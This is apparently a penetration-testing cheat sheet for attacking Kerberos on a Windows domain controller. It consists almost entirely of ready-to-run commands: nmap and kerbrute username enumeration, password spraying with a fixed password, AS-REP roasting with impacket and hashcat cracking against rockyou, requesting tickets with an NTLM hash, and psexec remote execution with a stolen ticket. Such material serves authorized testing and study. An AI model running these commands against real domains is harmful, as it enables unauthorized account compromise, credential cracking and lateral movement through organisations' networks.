# Kerberos Enumeration (88)

## Sync time with the DC
```bash
sudo ntpdate $DOMAIN
```

## Run nmap Kerberos scripts
```bash
nmap -p 88 --script=krb5-enum-users,krb5-realm $IP
```

## Enumerate usernames only if you need a user list and no lower-noise source exists
```bash
kerbrute userenum -d $DOMAIN --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

## Password spray only after lockout and replay checks
```bash
kerbrute passwordspray -d $DOMAIN --dc $IP users.txt 'Password123!'
```

## No-creds AS-REP roast
```bash
impacket-GetNPUsers "$DOMAIN"/ -dc-ip $IP -usersfile users.txt -request -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Request TGT with NTLM hash
```bash
impacket-getTGT "$DOMAIN"/username -hashes :ntlm_hash
```

## Use a Kerberos ticket with Impacket
```bash
export KRB5CCNAME=username.ccache
impacket-psexec "$DOMAIN"/username@"target.$DOMAIN" -k -no-pass
```
